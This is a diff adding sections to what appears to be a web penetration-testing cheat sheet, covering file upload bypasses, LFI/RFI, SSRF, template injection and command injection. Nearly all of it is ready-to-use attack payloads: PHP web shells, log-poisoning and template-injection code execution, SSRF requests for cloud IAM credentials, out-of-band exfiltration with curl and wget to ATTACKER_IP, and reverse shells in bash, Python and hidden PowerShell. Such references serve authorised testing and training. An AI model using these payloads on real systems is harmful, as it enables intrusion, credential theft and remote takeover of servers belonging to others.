@@ -339,3 +339,534 @@ And then attempt to use curl to download the webshell to the server, using `$IFS
 <message></message>
 </root>
 ```
+
+## 6) File Upload Bypasses
+
+### Quick Checks
+Things to identify first:
+
+| Check | Why it matters |
+|---|---|
+| Allowed extensions | Determines bypass strategy |
+| Upload path | Confirms if file is web-accessible |
+| Rename behaviour | Need final filename to execute/access |
+| Content-Type validation | Can often be changed in Burp |
+| Magic byte validation | Need valid file header/polyglot |
+| Server stack | PHP/ASP/JSP payload choice |
+
+### Basic PHP Web Shells
+```php
+<?php system($_GET['cmd']); ?>
+```
+```php
+<?=`$_GET[0]`?>
+```
+
+Usage:
+```bash
+curl 'http://target/uploads/shell.php?cmd=id'
+curl 'http://target/uploads/shell.php?0=id'
+```
+
+### Extension Bypasses
+Try these when `.php` is blocked:
+```text
+shell.php5
+shell.phtml
+shell.phar
+shell.php.
+shell.php%00.jpg
+shell.php%20
+shell.php%0a
+shell.php/
+shell.php;.jpg
+shell.jpg.php
+shell.PHP
+```
+
+Apache/PHP common executable extensions:
+```text
+.php
+.php3
+.php4
+.php5
+.phtml
+.phar
+```
+
+ASP/ASPX/JSP targets:
+```text
+shell.asp
+shell.aspx
+shell.jsp
+```
+
+### Content-Type Bypass
+Change in Burp:
+```http
+Content-Type: image/jpeg
+```
+
+Other useful types:
+```text
+image/png
+image/gif
+application/octet-stream
+text/plain
+```
+
+### Magic Byte / Polyglot Bypass
+Add image headers before PHP:
+```php
+GIF89a;
+<?php system($_GET['cmd']); ?>
+```
+
+Or append shell to real image:
+```bash
+cp image.jpg shell.php
+echo '<?php system($_GET["cmd"]); ?>' >> shell.php
+```
+
+### Double Extension With Weak Server Rules
+```text
+shell.php.jpg
+shell.jpg.php
+shell.phtml.jpg
+```
+
+If Apache is configured with multiple extension handling, `file.php.jpg` may still execute as PHP.
+
+### Useful Upload Locations to Try
+```text
+/uploads/shell.php
+/upload/shell.php
+/files/shell.php
+/images/shell.php
+/assets/shell.php
+/static/shell.php
+/media/shell.php
+```
+
+### If Upload Is Stored but Not Executed
+Try to combine with:
+
+| Technique | Example |
+|---|---|
+| LFI include | `?page=uploads/shell.php` |
+| Path traversal | `?file=../../uploads/shell.php` |
+| Filename injection | filename as `../../../var/www/html/shell.php` |
+| Image processing bugs | metadata or parser-based issues |
+
+## 7) LFI / RFI / Path Traversal
+
+### Parameters Worth Testing
+```text
+file=
+path=
+page=
+template=
+view=
+include=
+document=
+download=
+folder=
+lang=
+locale=
+```
+
+### Basic Linux Reads
+```text
+../../../../etc/passwd
+../../../../../../etc/passwd
+/etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+```
+
+Useful Linux files:
+```text
+/etc/passwd
+/etc/hosts
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/cwd/index.php
+/var/www/html/index.php
+/var/www/html/config.php
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+```
+
+### Basic Windows Reads
+```text
+..\..\..\..\windows\win.ini
+../../../../windows/win.ini
+C:\Windows\win.ini
+C:/Windows/System32/drivers/etc/hosts
+```
+
+Useful Windows files:
+```text
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\inetpub\wwwroot\web.config
+C:\xampp\htdocs\config.php
+C:\Users\<USER>\Desktop\user.txt
+```
+
+### PHP Wrappers
+Read source as base64:
+```text
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+```
+
+Decode:
+```bash
+echo '<BASE64>' | base64 -d
+```
+
+Other wrappers to test:
+```text
+php://input
+data://text/plain,<?php system($_GET['cmd']); ?>
+expect://id
+zip://shell.zip%23shell.php
+phar://shell.phar
+```
+
+### Log Poisoning to RCE
+Poison User-Agent:
+```http
+User-Agent: <?php system($_GET['cmd']); ?>
+```
+
+Include access log:
+```text
+?page=../../../../var/log/apache2/access.log&cmd=id
+?page=../../../../var/log/nginx/access.log&cmd=id
+```
+
+Other poisonable files:
+```text
+/var/log/auth.log
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/proc/self/environ
+```
+
+### RFI Quick Check
+Requires remote includes or equivalent risky behaviour.
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.txt
+python3 -m http.server 8000
+```
+
+Payload:
+```text
+?page=http://ATTACKER_IP:8000/shell.txt&cmd=id
+```
+
+## 8) SSRF
+
+### Quick Test URLs
+Use your listener first:
+```bash
+sudo tcpdump -ni tun0 port 80
+python3 -m http.server 80
+```
+
+Payloads:
+```text
+http://ATTACKER_IP/
+http://127.0.0.1/
+http://localhost/
+http://0.0.0.0/
+http://[::1]/
+```
+
+### Internal Service Targets
+```text
+http://127.0.0.1:80/
+http://127.0.0.1:5000/
+http://127.0.0.1:8000/
+http://127.0.0.1:8080/
+http://127.0.0.1:9000/
+http://localhost:3000/
+```
+
+Internal host discovery:
+```text
+http://10.0.0.1/
+http://172.16.0.1/
+http://192.168.0.1/
+```
+
+### Cloud Metadata
+AWS:
+```text
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+AWS IMDSv2 requires a token, but IMDSv1 may still work:
+```bash
+curl http://169.254.169.254/latest/meta-data/
+```
+
+Azure:
+```text
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+```
+
+GCP:
+```text
+http://metadata.google.internal/computeMetadata/v1/
+```
+
+### Bypass Tricks
+```text
+http://127.1/
+http://2130706433/
+http://0177.0.0.1/
+http://0x7f.0x00.0x00.0x01/
+http://localhost@evil.com/
+http://evil.com@127.0.0.1/
+http://127.0.0.1.nip.io/
+```
+
+URL encoding:
+```text
+http://127.0.0.1%2f
+http://127.0.0.1%252f
+```
+
+### SSRF Port Scan With ffuf
+```bash
+seq 1 10000 > ports.txt
+ffuf -w ports.txt:FUZZ -u 'http://target/fetch?url=http://127.0.0.1:FUZZ/' -fs <BASELINE_SIZE>
+```
+
+### SSRF to Redis Quick Win
+If `gopher://` is supported, Redis on localhost can sometimes write files or cron jobs.
+Test first:
+```text
+gopher://127.0.0.1:6379/_
+```
+
+Often blocked, but worth remembering when SSRF supports non-HTTP schemes.
+
+## 9) SSTI
+
+### Detection Payloads
+Generic:
+```text
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+${{7*7}}
+```
+
+If output is `49`, identify the engine.
+
+### Jinja2 / Flask
+Detection:
+```text
+{{7*7}}
+{{config}}
+{{self}}
+```
+
+Read files:
+```text
+{{ cycler.__init__.__globals__.open('/etc/passwd').read() }}
+```
+
+RCE:
+```text
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+```
+
+Alternative:
+```text
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+Reverse shell:
+```text
+{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
+```
+
+### Twig / Symfony
+Detection:
+```text
+{{7*7}}
+{{_self}}
+```
+
+RCE attempts:
+```text
+{{['id']|filter('system')}}
+{{['id']|map('system')|join}}
+```
+
+### Freemarker
+Detection:
+```text
+${7*7}
+```
+
+RCE:
+```text
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+```
+
+### Velocity
+Detection:
+```text
+#set($x=7*7)$x
+```
+
+### ERB / Ruby
+Detection:
+```text
+<%= 7*7 %>
+```
+
+RCE:
+```text
+<%= system('id') %>
+<%= `id` %>
+```
+
+## 10) Command Injection
+
+### Basic Separators
+```text
+;id
+&& id
+|| id
+| id
+`id`
+$(id)
+%0aid
+%0did
+```
+
+Windows:
+```text
+& whoami
+&& whoami
+| whoami
+%0a whoami
+```
+
+### Blind Command Injection
+Time delay:
+```text
+;sleep 5
+&& sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+```
+
+Windows delay:
+```text
+& timeout /T 5
+& ping -n 6 127.0.0.1
+```
+
+Out-of-band:
+```text
+;curl http://ATTACKER_IP/$(whoami)
+;wget http://ATTACKER_IP/$(hostname)
+;nslookup $(whoami).ATTACKER_DOMAIN
+```
+
+Listener:
+```bash
+python3 -m http.server 80
+sudo tcpdump -ni tun0 icmp or port 53 or port 80
+```
+
+### Whitespace Bypasses
+```text
+${IFS}
+$IFS$9
+%09
+%0a
+<
+```
+
+Examples:
+```text
+;cat${IFS}/etc/passwd
+;cat</etc/passwd
+;bash${IFS}-c${IFS}'id'
+```
+
+### Character Bypasses
+If `/` is blocked:
+```bash
+echo ${PATH:0:1}
+```
+
+Payload:
+```text
+;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+If spaces and slashes are blocked, try base64:
+```bash
+echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64 -w0
+```
+
+Payload:
+```text
+;echo${IFS}<BASE64>|base64${IFS}-d|bash
+```
+
+### Reverse Shells
+Listener:
+```bash
+nc -lvnp 4444
+```
+
+Bash:
+```text
+;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+```
+
+URL-encoded bash:
+```text
+%3bbash%20-c%20%27bash%20-i%20%3e%26%20/dev/tcp/ATTACKER_IP/4444%200%3e%261%27
+```
+
+Python:
+```text
+;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
+```
+
+Windows PowerShell:
+```powershell
+powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
+```
+
+### Common Injection Points
+```text
+host=
+ip=
+domain=
+url=
+cmd=
+command=
+exec=
+ping=
+debug=
+file=
+path=
+```
